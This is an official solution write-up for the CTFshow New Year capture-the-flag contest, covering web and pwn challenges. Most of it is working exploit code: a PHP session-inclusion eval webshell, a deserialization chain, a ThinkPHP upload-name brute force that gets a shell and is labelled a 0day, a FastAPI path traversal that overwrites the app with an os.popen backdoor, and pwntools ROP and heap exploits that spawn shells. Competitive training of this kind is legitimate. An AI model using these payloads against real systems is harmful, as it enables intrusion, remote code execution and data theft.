CTFshow元旦水友赛官方wp
比赛概述
比赛形式为个人赛
比赛时间为48小时
开始时间2023年12月31日上午10时 
结束时间2024年01月02日上午10时
比赛平台为 https://ctf.show
比赛奖励为现金2866元
详情看https://www.bilibili.com/read/cv28223352/
WEB部分
web1 easy_include
题目名称 easy_include
出题人 h1xa
分值 100分
解析
题目代码
PHP<?phpfunction waf($path){    $path = str_replace(".","",$path);    return preg_match("/^[a-z]+/",$path);}if(waf($_POST[1])){    include "file://".$_POST[1];}
观察cookie，发现自动开启了session，直接session文件包含，这里不需要竞争
exp
Pythonimport requests# Author:ctfshow-h1xaurl = "xxx"data = {    'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[2]);?>',    '1':'localhost/tmp/sess_ctfshow',    '2':'system("cat /flag_is_here.txt");'}file = {    'file': 'ctfshow'}cookies = {    'PHPSESSID': 'ctfshow'}response = requests.post(url=url,data=data,files=file,cookies=cookies)print(response.text)
其他解法
没过滤点，直接自由飞翔了
web2 easy_web
题目名称 easy_web
出题人 chu0
分值 200分
解析
[ez_web.pdf]
exp
Pythonimport socketimport gzipfrom io import BytesIO# 目标服务器信息# 这里直接写域名，不要http:// 和 /host = "xxx"port = 80replace = "http://" + host + ":" + str(port)request = '''POST /?%73%68%6f%77%5b%73%68%6f%77%2e%73%68%6f%77=%43%3a%38%3a%22%53%70%6c%53%74%61%63%6b%22%3a%31%37%31%3a%7b%69%3a%36%3b%3a%4f%3a%33%3a%22%63%74%66%22%3a%32%3a%7b%73%3a%32%3a%22%68%31%22%3b%4f%3a%34%3a%22%73%68%6f%77%22%3a%30%3a%7b%7d%73%3a%32%3a%22%68%32%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%33%3a%7b%69%3a%30%3b%73%3a%30%3a%22%22%3b%69%3a%31%3b%73%3a%30%3a%22%22%3b%69%3a%32%3b%4f%3a%31%30%3a%22%43%68%75%30%5f%77%72%69%74%65%22%3a%33%3a%7b%73%3a%34%3a%22%63%68%75%30%22%3b%73%3a%39%3a%22%78%69%75%78%69%75%78%69%75%22%3b%73%3a%34%3a%22%63%68%75%31%22%3b%52%3a%31%30%3b%73%3a%33%3a%22%63%6d%64%22%3b%4e%3b%7d%7d%7d%7d%7d&name=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8/convert.base64-decode/resource=ctfw&chu0=Y=00X=00N=00z=00Z=00X=00J=000=00&cmd=%73%68%6f%77_source(chr(47).chr(102).chr(108).chr(97).chr(103)); HTTP/1.1Host: '''+host+'''Content-Length: 38Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: '''+replace+'''Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: '''+replace+'''/?%73%68%6f%77%5b%73%68%6f%77%2e%73%68%6f%77=%43%3a%38%3a%22%53%70%6c%53%74%61%63%6b%22%3a%31%37%31%3a%7b%69%3a%36%3b%3a%4f%3a%33%3a%22%63%74%66%22%3a%32%3a%7b%73%3a%32%3a%22%68%31%22%3b%4f%3a%34%3a%22%73%68%6f%77%22%3a%30%3a%7b%7d%73%3a%32%3a%22%68%32%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%33%3a%7b%69%3a%30%3b%73%3a%30%3a%22%22%3b%69%3a%31%3b%73%3a%30%3a%22%22%3b%69%3a%32%3b%4f%3a%31%30%3a%22%43%68%75%30%5f%77%72%69%74%65%22%3a%33%3a%7b%73%3a%34%3a%22%63%68%75%30%22%3b%73%3a%39%3a%22%78%69%75%78%69%75%78%69%75%22%3b%73%3a%34%3a%22%63%68%75%31%22%3b%52%3a%31%30%3b%73%3a%33%3a%22%63%6d%64%22%3b%4e%3b%7d%7d%7d%7d%7d&name=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8/convert.base64-decode/resource=ctfw&chu0=Y=00X=00N=00z=00Z=00X=00J=000=00&cmd=%73%68%6f%77_source(chr(47).chr(102).chr(108).chr(97).chr(103));Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closechu0=1&cmd=1&name=1&show%5Bshow.show=1'''with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:    s.connect((host, port))    s.sendall(request.encode())    response = s.recv(4096)    header, content = response.split(b'\r\n\r\n', 1)    if header.startswith(b'HTTP/1.1 200 OK') and b'Content-Encoding: gzip' in header:        with gzip.GzipFile(fileobj=BytesIO(content)) as f:            uncompressed_data = f.read()            print(uncompressed_data.decode('utf-8'))    else:        print(content.decode('utf-8'))
web3 孤注一掷
题目名称 孤注一掷
出题人 h1xa
0day~
分值 400分
解析
robots.txt查看源码泄露,下载www.zip发现 存在文件上传控制器
PHP<?phpnamespace app\index\controller;use think\Controller;use think\Request;class Upload extends Controller{    public function image(Request $request)    {        $file = $request->file('file');        if( ! $file ) {            $this->error("error.");        }        $info = $file->move(ROOT_PATH . 'public' . DS . 'uploads');        $filename = '/uploads/' . str_replace("\\", "/", $info->getSaveName());        $this->success('', null, $filename);    }}
路径确认为了 ROOT_PATH . 'public' . DS . 'uploads'
下面只要确定好文件名，即可getshell
File.php 中
PHP        // 文件保存命名规则        $saveName = $this->buildSaveName($savename);        $filename = $path . $saveName;
跟进 buildSaveName 方法
PHPprotected function buildSaveName($savename)    {        // 自动生成文件名        if (true === $savename) {            if ($this->rule instanceof \Closure) {                $savename = call_user_func_array($this->rule, [$this]);            } else {                switch ($this->rule) {                    case 'date':                        $savename = date('Ymd') . DS . md5(microtime(true));                        break;                    default:                        //省略                }            }        } elseif ('' === $savename || false === $savename) {            $savename = $this->getInfo('name');        }        if (!strpos($savename, '.')) {            $savename .= '.' . pathinfo($this->getInfo('name'), PATHINFO_EXTENSION);        }        return $savename;    }
漏洞代码
PHP$savename = date('Ymd') . DS . md5(microtime(true));
路径中前半部分年月日可控，后半部分和时间有关，可以碰撞，后面详细讲碰撞
前面的$file 通过 $request->file('file');获得，跟进
PHP    /**     * 获取上传的文件信息     * @access public     * @param string|array $name 名称     * @return null|array|\think\File     */    public function file($name = '')    {        if (empty($this->file)) {            $this->file = isset($_FILES) ? $_FILES : [];        }        if (is_array($name)) {            return $this->file = array_merge($this->file, $name);        }        $files = $this->file;        if (!empty($files)) {            // 处理上传文件            $array = [];            foreach ($files as $key => $file) {                if (is_array($file['name'])) {                    //省略                } else {                    if ($file instanceof File) {                        $array[$key] = $file;                    } else {                        if (empty($file['tmp_name']) || !is_file($file['tmp_name'])) {                            continue;                        }                        $array[$key] = (new File($file['tmp_name']))->setUploadInfo($file);                    }                }            }            //省略        }        return;    }
这里设置info为$_FILES['file']
PHP    public function setUploadInfo($info)    {        $this->info = $info;        return $this;    }
也就是这里
PHP    /**     * 获取上传文件的信息     * @access public     * @param  string $name 信息名称     * @return array|string     */    public function getInfo($name = '')    {        return isset($this->info[$name]) ? $this->info[$name] : $this->info;    }
其实拿到的是$_FILES['file']['name']
再看后缀处理
PHP        if (!strpos($savename, '.')) {            $savename .= '.' . pathinfo($this->getInfo('name'), PATHINFO_EXTENSION);        }
这里只要上传php文件，就获得的是$_FILES['file']['name']
后缀就是我们自定义的后缀php
再看拼接
PHP        if (!strpos($savename, '.')) {            $savename .= '.' . pathinfo($this->getInfo('name'), PATHINFO_EXTENSION);        }
帮我们加了. 后，也就是
date('Ymd') . DS . md5(microtime(true)).php
下面开始爆破
从http的返回头可以看到服务器时间
我们转换后，直接在这个范围内爆破即可
exp
Pythonimport requestsfrom datetime import datetimeimport subprocessimport pytzimport hashlib# Author:ctfshow-h1xaurl ="http://792724e5-9877-4dfb-9cfe-2f267337ca9d.challenge.ctf.show/"scriptDate = ""prefix = ""session = requests.Session()headers = {'User-Agent': 'Android'}def init():    route="?url="+url    session.get(url=url+route,headers=headers)def getPrefix():    route="index/upload/image"    file = {"file":("1.php",b"<?php echo 'ctfshow';eval($_POST[1]);?>")}    response = session.post(url=url+route,files=file,headers=headers)    response_date = response.headers['date']    print("正在获取服务器时间：")    print(response_date)    date_time_obj = datetime.strptime(response_date, "%a, %d %b %Y %H:%M:%S %Z")    date_time_obj = date_time_obj.replace(tzinfo=pytz.timezone('GMT'))    date_time_obj_gmt8 = date_time_obj.astimezone(pytz.timezone('Asia/Shanghai'))    print("正在转换服务器时间：")    print(date_time_obj_gmt8)    year = date_time_obj_gmt8.year    month = date_time_obj_gmt8.month    day = date_time_obj_gmt8.day    hour = date_time_obj_gmt8.hour    minute = date_time_obj_gmt8.minute    second = date_time_obj_gmt8.second    global scriptDate,prefix    scriptDate = str(year)+str(month)+(str("0"+str(day)) if day<10 else str(day))    seconds = int(date_time_obj_gmt8.timestamp())    print("服务器时间：")    print(seconds)    code = f'''php -r "echo mktime({hour},{minute},{second},{month},{day},{year});"'''    print("脚本时间：")    result = subprocess.run(code,shell=True, capture_output=True, text=True)    script_time=int(result.stdout)    print(script_time)    if seconds == script_time:        print("时间碰撞成功，开始爆破毫秒")        prefix =  seconds    else:        print("错误，服务器时间和脚本时间不一致")        exit()def checkUrl():    h = open("url.txt","a")    global scriptDate    for i in range(1000,9999):        target = str(prefix)+"."+str(i)        md5 =string_to_md5(target)        route = "/uploads/"+scriptDate+"/"+md5+".php"        print("正在爆破"+route)        response = session.get(url=url+route,headers=headers)        if response.status_code == 200:            print("成功getshell，地址为 "+url+route)            exit()        h.write(route+"\n")    h.close()    print("爆破结束")    returndef string_to_md5(string):    md5_val = hashlib.md5(string.encode('utf8')).hexdigest()    return md5_valif __name__ == "__main__":    init()    getPrefix()    checkUrl()
web4  easy_login
题目名称 easy_login
出题人 h1xa
0day~
分值 400分
解析
是以前题目的补丁版本 ，以前题目出现了fast gc的非预期，这里进行了patch
结果依然还是非预期
题目已经开源 
题目源码：https://gitee.com/ctfshow/easy-login
下面是预期解的思路
主要更新的地方在
PHPclass userLogger{    public $username;    private $password;    private $filename;    public function __construct(){        $this->filename = "log.txt_$this->username-$this->password";        $data = "最后操作时间：".date("Y-m-d H:i:s")." 用户名 $this->username 密码 $this->password \n";        $d = file_put_contents($this->filename,$data,FILE_APPEND);    }    public function setLogFileName($filename){        $this->filename = $filename;    }    public function __wakeup(){        $this->filename = "log.txt";    }    public function user_register($username,$password){        $this->username = $username;        $this->password = $password;        $data = "操作时间：".date("Y-m-d H:i:s")."用户注册： 用户名 $username 密码 $password\n";        file_put_contents($this->filename,$data,FILE_APPEND);    }    public function user_login($username,$password){        $this->username = $username;        $this->password = $password;        $data = "操作时间：".date("Y-m-d H:i:s")."用户登陆： 用户名 $username 密码 $password\n";        file_put_contents($this->filename,$data,FILE_APPEND);    }    public function user_logout(){        $data = "操作时间：".date("Y-m-d H:i:s")."用户退出： 用户名 $this->username\n";        file_put_contents($this->filename,$data,FILE_APPEND);    }    // public function __destruct(){    //     $data = "最后操作时间：".date("Y-m-d H:i:s")." 用户名 $this->username 密码 $this->password \n";    //     $d = file_put_contents($this->filename,$data,FILE_APPEND);            // }}
将析构方法进行了注释删除，内容移到构造方法中，试图patch掉fast gc的非预期
利用脚本如下
exp
Pythonimport requestsimport time# Author:ctfshow-h1xaurl = "http://xxx/"def step1():    data={        "username":"userLogger",        "password":"<?=eval($_POST[1]);?>.php"    }    response = requests.post(url=url+"index.php?action=do_register",data=data)    time.sleep(1)    if "script" in response.text:        print("第一步执行完毕")    else:        print(response.text)        exit()def step2():    data="token=user|O%3A11%3A%22application%22%3A6%3A%7Bs%3A6%3A%22cookie%22%3BO%3A13%3A%22cookie_helper%22%3A1%3A%7Bs%3A21%3A%22%00cookie_helper%00secret%22%3Bs%3A20%3A%22ctfshow_36d_boy_h1xa%22%3B%7Ds%3A5%3A%22mysql%22%3BO%3A12%3A%22mysql_helper%22%3A2%3A%7Bs%3A16%3A%22%00mysql_helper%00db%22%3Ba%3A7%3A%7Bs%3A3%3A%22dsn%22%3Bs%3A55%3A%22mysql%3Ahost%3D127.0.0.1%3Bdbname%3Dblog%3Bport%3D3306%3Bcharset%3Dutf8%22%3Bs%3A4%3A%22host%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A4%3A%22port%22%3Bs%3A4%3A%223306%22%3Bs%3A6%3A%22dbname%22%3Bs%3A4%3A%22blog%22%3Bs%3A8%3A%22username%22%3Bs%3A4%3A%22root%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22root%22%3Bs%3A7%3A%22charset%22%3Bs%3A4%3A%22utf8%22%3B%7Ds%3A6%3A%22option%22%3Ba%3A1%3A%7Bi%3A19%3Bi%3A262152%3B%7D%7Ds%3A9%3A%22dispather%22%3BN%3Bs%3A5%3A%22loger%22%3BO%3A10%3A%22userLogger%22%3A3%3A%7Bs%3A8%3A%22username%22%3BN%3Bs%3A20%3A%22%00userLogger%00password%22%3BN%3Bs%3A20%3A%22%00userLogger%00filename%22%3Bs%3A10%3A%22..%2Flog.txt%22%3B%7Ds%3A5%3A%22debug%22%3Bb%3A1%3Bs%3A10%3A%22dispatcher%22%3BO%3A10%3A%22dispatcher%22%3A0%3A%7B%7D%7D"    response = requests.get(url=url+"index.php?action=main&token="+data)    time.sleep(1)    print("第二步执行完毕")def step3():    data={        "1":"system('whoami && cat /f*');",    }    response = requests.post(url=url+"log.txt_-%3C%3F%3Deval(%24_POST%5B1%5D)%3B%3F%3E.php",data=data)    time.sleep(1)    if "www-data" in response.text:        print("第三步 getshell 成功")        print(response.text)    else:        print("第三步 getshell 失败")if __name__ == '__main__':    step1()    step2()    step3()
web5 easy_api
题目名称 easy_api
出题人 h1xa
分值 400分
解析
访问openapi.json 获取路由
JSON{    "openapi": "3.1.0",    "info": {        "title": "FastAPI",        "version": "0.1.0"    },    "paths": {        "/upload/": {            "post": {                "summary": "Upload File",                "operationId": "upload_file_upload__post",                "requestBody": {                    "content": {                        "multipart/form-data": {                            "schema": {                                "$ref": "#/components/schemas/Body_upload_file_upload__post"                            }                        }                    },                    "required": true                },                "responses": {                    "200": {                        "description": "Successful Response",                        "content": {                            "application/json": {                                "schema": {}                            }                        }                    },                    "422": {                        "description": "Validation Error",                        "content": {                            "application/json": {                                "schema": {                                    "$ref": "#/components/schemas/HTTPValidationError"                                }                            }                        }                    }                }            }        },        "/uploads/{fileIndex}": {            "get": {                "summary": "Download File",                "operationId": "download_file_uploads__fileIndex__get",                "parameters": [                    {                        "name": "fileIndex",                        "in": "path",                        "required": true,                        "schema": {                            "type": "string",                            "title": "Fileindex"                        }                    }                ],                "responses": {                    "200": {                        "description": "Successful Response",                        "content": {                            "application/json": {                                "schema": {}                            }                        }                    },                    "422": {                        "description": "Validation Error",                        "content": {                            "application/json": {                                "schema": {                                    "$ref": "#/components/schemas/HTTPValidationError"                                }                            }                        }                    }                }            }        },        "/list": {            "get": {                "summary": "List File",                "operationId": "list_file_list_get",                "responses": {                    "200": {                        "description": "Successful Response",                        "content": {                            "application/json": {                                "schema": {}                            }                        }                    }                }            }        },        "/": {            "get": {                "summary": "Index",                "operationId": "index__get",                "responses": {                    "200": {                        "description": "Successful Response",                        "content": {                            "application/json": {                                "schema": {}                            }                        }                    }                }            }        }    },    "components": {        "schemas": {            "Body_upload_file_upload__post": {                "properties": {                    "file": {                        "type": "string",                        "format": "binary",                        "title": "File"                    }                },                "type": "object",                "required": [                    "file"                ],                "title": "Body_upload_file_upload__post"            },            "HTTPValidationError": {                "properties": {                    "detail": {                        "items": {                            "$ref": "#/components/schemas/ValidationError"                        },                        "type": "array",                        "title": "Detail"                    }                },                "type": "object",                "title": "HTTPValidationError"            },            "ValidationError": {                "properties": {                    "loc": {                        "items": {                            "anyOf": [                                {                                    "type": "string"                                },                                {                                    "type": "integer"                                }                            ]                        },                        "type": "array",                        "title": "Location"                    },                    "msg": {                        "type": "string",                        "title": "Message"                    },                    "type": {                        "type": "string",                        "title": "Error Type"                    }                },                "type": "object",                "required": [                    "loc",                    "msg",                    "type"                ],                "title": "ValidationError"            }        }    }}
上传文件名带有 / 的文件发现上传失败，list没有看到上传文件，怀疑使用了·
os.path.join 进行了路径拼接
那只要上传文件名字换成我们需要读取的文件名字，即可
即使上传失败，通过读取路由 依然可以成功读取到敏感文件
这里fastapi 如果使用uvicorn 进行负载，并启动了热部署，可以拿到路径后，直接覆盖主程序
自己写一个getshell的api即可
主要思路如下：
拿到uvicorn启动的目录 可以从环境变量中读取
拿到uvicorn 启动的脚本名字 cmdline中读取
检查 cmdline 中是否有 reload参数
写一个100字符内的api木马，覆盖主程序，名字不能变
用api木马getshell
tips:
上传文件限定长度为100字符，需要写一个微型api马
文件读取限定长度为100字符
无回显，需要反弹处理，没有nc 可以使用ptyhon或者bash反弹
也可以http外带出数据
写可以path掉自己的微型马 换大马
题目的关键代码如下
Python@app.post("/upload/")async def upload_file(file: UploadFile,background_tasks: BackgroundTasks):  contents = await file.read()  index = str(uuid.uuid4())  name = file.filename  files.update({index:name})  uploads_dir = os.path.join(os.getcwd()+"/uploads/", files[index])  background_tasks.add_task(create_file,uploads_dir,contents[:100])  return {"fileName": index}# Author:ctfshow-h1xa@app.get("/uploads/{fileIndex}")async def download_file(fileIndex: str):  dust = os.path.join(os.getcwd()+"/uploads/", files[fileIndex])  with open(dust,"r") as f:    contents = f.read(100)  return {"fileName": fileIndex,"fileContent":contents}@app.get("/list")async def list_file():  return {"fileName": [*files]}
微型api马可以参考，小于100字符，注意替换${app}为实际值，一般为app
Pythonimport uvicorn,osfrom fastapi import *{app} = FastAPI()@{app}.get("/s")def s(c):  os.popen(c)
exp
Python#-*- coding : utf-8 -*-# coding: utf-8import timeimport requestsimport io,jsonurl = "http://xxxx/"app = ''# Author:ctfshow-h1xadef get_api():    response = requests.get(url=url+"openapi.json")    if "FastAPI" in response.text:        apijson = json.loads(response.text)    return apijson        def get_pwd():    pwd = ''    for pid in range(20):        data = f'/proc/{pid}/environ'        file = upload(data)        content = download(file['fileName'])        if content['fileName'] and 'PWD' in content['fileContent']:            pwd = content['fileContent'][content['fileContent'].find("PWD=")+4:content['fileContent'].find("GPG_KEY=")]+'/'            break    return pwddef get_python_file():    python_file = ''    for pid in range(20):        data = f'/proc/{pid}/cmdline'        file = upload(data)        content = download(file['fileName'])        if content['fileName'] and 'uvicorn' in content['fileContent']:            if 'reload' in content['fileContent']:                print("[√] 检测到存在reload参数，可以进行热部署")                python_file = content['fileContent'][content['fileContent'].find("uvicorn")+7:content['fileContent'].find(":")]+".py"                print(f"[√] 检测到主程序，{python_file}")                global app                app = content['fileContent'][content['fileContent'].find("uvicorn")+7+len(python_file)-3+1:content['fileContent'].find("--")]                print(f"[√] 检测到uvicorn的应用名，{app}")            else:                print("[x] 检测到无reload参数，无法热部署，程序结束")                exit()            break    return python_filedef new_file():    global app    return f'''import uvicorn,osfrom fastapi import *{app} = FastAPI()@{app}.get("/s")def s(c):  os.popen(c)'''.replace("\x00","")def get_shell(name):    name = name.replace("\x00","")    response = requests.post(            url=url+"upload/",            files={"file":(name, new_file())}        )    if 'fileName' in response.text:        print(f"[√] 上传成功，等待5秒重载主程序 ")        for i in range(5):            time.sleep(1)            print("[√] "+str(5-i)+" 秒后验证重载")    else:        print("[x] 主程序重写失败，程序退出")        exit()    try:        response = requests.get(url=url+'s/?c=whoami', timeout=3)    except:        print("[x] 主程序重载失败，程序退出")        exit()    if response.status_code == 200:        print(f"[√] 恭喜，getshell成功 路径为{url}s/ ")    else:        print("[x] 主程序重载失败，程序退出")        exit()def upload(name):    f = io.BytesIO(b'a' * 100)    response = requests.post(            url=url+"upload/",            files={"file":(name, f)}        )    if 'fileName' in response.text:        data = json.loads(response.text)        return data    else:        return {'fileName':''}def download(file):    response = requests.get(url=url+"uploads/"+file)    if 'fileName' in response.text:        data = json.loads(response.text)        return data    else:        return {'fileName':''}def main():    print("[√] 开始读取openapi.json")    apijson = get_api()    print("[√] 开放api有")    print(*apijson['paths'])    print("[√] 开始读取运行目录")    pwd = get_pwd()    if pwd:        print(f"[√] 运行目录读取成功 路径为{pwd}")    else:        print("[x] 运行路径读取失败，程序退出")        exit()    python_file = get_python_file()    if python_file:        print(f"[√] uvicorn主文件读取成功 路径为{pwd}{python_file}")    else:        print("[x] uvicorn主文件读取失败，程序退出")        exit()    get_shell(pwd+python_file)if __name__ == "__main__":    main()
PWN部分
pwn1 Badboy
题目名称 Badboy
出题人 Zz_Zz
题目描述 坏男孩的心思你不懂
分值 100分
一、环境
libc版本：GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.6) stable release version 2.27.
操作系统：pwn01链接的靶机
题目描述：坏男孩的心思你不懂
二、程序保护情况
Shellctfshow@ubuntu:~/BadBoy-2$ checksec BadBoy-2[*] '/home/ctfshow/BadBoy-2/BadBoy-2'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)
三、解题过程
使用ida查看程序反编译代码
查看kl变量，发现是全局变量，且初始值为6
while循环语句里，读取%ld的数字，存储到无符号的变量v4，并使用write打印kl长度的buf+v4的内容，输出完毕后将kl值减3，
因此while语句可以执行两次，第一次打印的长度为6，第二次打印的长度为3
利用两次打印，通过数组溢出，实现stack地址和libc地址末3字节的泄露。
由于v5值不能大于8，打算通过输入负数，通过数组溢出，实现puts.got表的更改，更改为system函数地址。
buf的内容只允许输入3个字符，无法输入"/bin/sh\x00"，因此直接输入"sh\x00"获取shell。
[Badboy-2视频解说.mp4]
exp
Pythonfrom pwn import *context(log_level='debug',arch='amd64',os='linux')filename = "./BadBoy-2"io = process(filename)elf = ELF(filename)libc = elf.libc#gdb.attach(io,"b *0x400987")payload = "40"io.sendlineafter("i am bad boy \n",payload)stack_addr = u64(io.recv(6).ljust(8,b'\x00'))print("stack_addr:" + hex(stack_addr))payload = "24"io.sendlineafter("i am bad boy \n",payload)libc_start_call_main = u64(io.recv(3).ljust(8,b'\x00'))print("libc_start_call_main:" + hex(libc_start_call_main))payload = b'sh\x00'io.sendafter("because i'm not girl ",payload)puts_got_index = -(stack_addr - 0xf8  - 0x601018)print("puts_got_index:" + hex(puts_got_index))payload = str(puts_got_index)io.sendlineafter("so can you fell me? ",payload)system_addr = libc_start_call_main - 0x21c87 + libc.sym['system']payload = p64(system_addr)io.sendafter("HaHaHa ",payload)io.interactive()
pwn2 s.s.a.l
题目名称 s.s.a.l
出题人 Zz_Zz
分值 200分
一、环境
libc版本：GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.6) stable release version 2.27.
操作系统：pwn01链接的靶机
题目描述：这个程序怎么一个输出函数都没有？
二、程序保护情况
Shellctfshow@ubuntu:~/s.s.a.l$ checksec s.s.a.l[*] '/home/ctfshow/s.s.a.l/s.s.a.l'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)
三、解题过程
首先使用ida查看反编译代码
存在读入0x50长度到v4中，但无溢出现象。
查看zz_zz函数，发现是一些初始化函数，其中有几句是获取随机数的代码
接着查看Zz_Zz_955函数
v5是一段乱序的"/bin/sh"字符串
其次程序开始接收seed的数字(&unk_400984是“%d”)，然后将seed作为随机数种子使用。
接着是一个do-while语句，一共会执行7次循环。作用是将v5的内容作为随机存储在全局变量d中。
然后读取0x58的内容到v5中，这里存在栈溢出。
接着观察程序其它指令，发现存在部分无法反编译的指令。
看到syscall，可以尝试ret2syscall进行操作。尝试构造rax=0x3b、rdi="/bin/sh"、rsi=0、rdx=0
由于C语言的随机是伪随机，因此需要找到一个种子数，使得全局变量d中存储的内容就是"/bin/sh"。同时从前面可以看出，zz_zz函数的返回值是由随机数来决定的，因此编写下面C语言代码，找到种子数。
得到当种子数为370424时，符合我们的要求，因此rdi和rax构造完毕。
程序存在pop rsi;ret，因此rsi也很好构造。
当程序执行完rand()操作后，rdx的值不为0。但结合前面得到的指令：
Plain Textsar rdx,14hxor rdx,[rsp+8]
可以构造出rdx的值为0
通过多次执行，发现rdx的值为0x503d0e0
执行完sar rdx,14h指令后，rdx的值为0x50
因此在栈空间处布置内容为0x50，通过xor运算之后，rdx的值即为0，因此得到shell
[s.s.a.l视频解说.mp4]
exp
Pythonfrom pwn import *context(log_level='debug',arch='amd64',os='linux')filename = "./s.s.a.l"io = process(filename)elf = ELF(filename)libc = elf.libcgdb.attach(io,"b *0x4008cd")rdx_value = 0x50payload = flat([cyclic(32)])payload += p64(rdx_value)*3io.send(payload)pause()payload = "370424"io.sendline(payload)zz955 = 0x400802pop_rsi_rdi_ret = 0x400831syscall = 0x400760xor_rdx = 0x400834bss = 0x601090        pause()payload = flat([cyclic(30),zz955,pop_rsi_rdi_ret,pop_rsi_rdi_ret,0,bss,xor_rdx,syscall])print("len:" + hex(len(payload)))io.send(payload)io.interactive()
pwn3  Happy_New_Year
题目名称 Happy_New_Year
出题人 bit
分值 200分
exp
Pythonfrom pwn import *context.log_level='debug'#io = process('./pwn')io = remote('pwn.challenge.ctf.show',28294)elf = ELF('./pwn')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def add(index,size):        io.sendlineafter('¥¥¥¥¥¥', str(1))        io.sendlineafter('index:\n', str(index))        io.sendlineafter("Size:\n", str(size))def show(index):        io.sendlineafter('¥¥¥¥¥¥', str(2))        io.sendlineafter('index:\n', str(index))def edit(index, content):        io.sendlineafter('¥¥¥¥¥¥', str(3))        io.sendlineafter('index:\n', str(index))        io.sendafter("context: \n",content)def delete(index):        io.sendlineafter('¥¥¥¥¥¥', str(4))        io.sendlineafter('index:\n', str(index))add(0,0x428)add(1,0x500)add(2,0x418)delete(0)add(3,0x500)show(0)libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x3ec090edit(0,'b'*0x10)show(0)io.recvuntil('b'*0x10)heap_base = u64(io.recv(6).ljust(8,b'\x00'))-0x250rtld_global = libc_base + 0x61b060one_gadget = libc_base + 0x4f302delete(2)edit(0,p64(libc_base + 0x3ec090)*2+p64(heap_base+0x250)+p64(rtld_global-0x20))add(4,0x500)link_map=p64(0)*1link_map+=p64(libc_base+0x61c710)link_map+=p64(0)link_map+=p64(heap_base+0xb90)link_map+=p64(0)*28 link_map+=p64(heap_base+0xc08+0x98)link_map+=p64(heap_base+0xc08+32+0x98)link_map+=p64(heap_base+0xc08+0x10+0x98)link_map+=p64(8)link_map+=p64(one_gadget)link_map+=p64(heap_base+0xb90)link_map+=p64(0)*58link_map+=p64(0x800000000)edit(2,link_map)io.sendlineafter('¥¥¥¥¥¥', str(5))io.interactive()
pwn4  Heap_Harmony_Festivity
题目名称 Heap_Harmony_Festivity
出题人 bit
分值 200分
exp
Pythonfrom pwn import *context.log_level='debug'#io = process("./pwn")io = remote("pwn.challenge.ctf.show",28278)libc = ELF('/home/bit/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so')def add(index,size):        io.sendlineafter('¥¥¥¥¥¥', str(1))        io.sendlineafter('index:\n', str(index))        io.sendlineafter("Size:\n", str(size))def show(index):        io.sendlineafter('¥¥¥¥¥¥', str(2))        io.sendlineafter('index:\n', str(index))def edit(index, content):        io.sendlineafter('¥¥¥¥¥¥', str(3))        io.sendlineafter('index:\n', str(index))        io.sendafter("context: \n",content)def delete(index):        io.sendlineafter('¥¥¥¥¥¥', str(4))        io.sendlineafter('index:\n', str(index))add(0,0x428)add(1,0x500)add(2,0x418)delete(0)add(3,0x500)show(0)libc_base= u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x1ebfd0edit(0,'a'*0x10)show(0)io.recvuntil('a'*0x10)heap_base=u64(io.recv(6).ljust(8,b'\x00'))-0x290rtld_global=libc_base+0x222060one_gadget=libc_base+0xe6aeeret_addr=libc_base+0x0000000000025679setcontext=0x580DD+libc_basepop_rdi=libc_base+0x0000000000026b72pop_rsi=libc_base+0x0000000000027529pop_rdx_r12=libc_base+0x000000000011c1e1write_addr=libc_base+libc.symbols['write']open_addr=libc_base+libc.symbols['open']read_addr=libc.sym['read']+libc_basedelete(2)edit(0,p64(libc_base+0x3ec090)*2+p64(heap_base+0x290)+p64(rtld_global-0x20))add(4,0x500)link_map=p64(0)link_map+=p64(libc_base+0x223740)link_map+=p64(0)link_map+=p64(heap_base+0xb90+0x40)link_map+=p64(0)*28 link_map+=p64(heap_base+0xc08+0x98+0x40)link_map+=p64(heap_base+0xc08+32+0x98+0x40)link_map+=p64(heap_base+0xc08+0x10+0x98+0x40)link_map+=p64(0x20)link_map+="flag\x00\x00\x00\x00"link_map+=p64(heap_base+0xb90+0x40)link_map+=p64(setcontext)link_map+=p64(ret_addr)link_map+=p64(0)*12link_map+=p64(0)link_map+=p64(heap_base+0xdc8)link_map+=p64(0)*2link_map+=p64(0x100)link_map+=p64(0)*2link_map+=p64(heap_base+0xdc8)link_map+=p64(read_addr)link_map+=p64(0)*36link_map+=p64(0x800000000)edit(2,link_map)io.sendlineafter('¥¥¥¥¥¥', str(5))flag_addr=heap_base+0xd00orw=p64(pop_rdi)+p64(flag_addr)orw+=p64(pop_rsi)+p64(0)orw+=p64(open_addr)orw+=p64(pop_rdi)+p64(3)orw+=p64(pop_rsi)+p64(heap_base)orw+=p64(pop_rdx_r12)+p64(0x50)+p64(0)orw+=p64(read_addr)orw+=p64(pop_rdi)+p64(1)orw+=p64(pop_rsi)+p64(heap_base)orw+=p64(pop_rdx_r12)+p64(0x50)+p64(0)orw+=p64(write_addr)io.sendline(orw)io.interactive()
pwn5  yes_or_no
题目名称 yes_or_no
出题人 久而不念
分值 300分
爆破概率为 1/0xff
exp
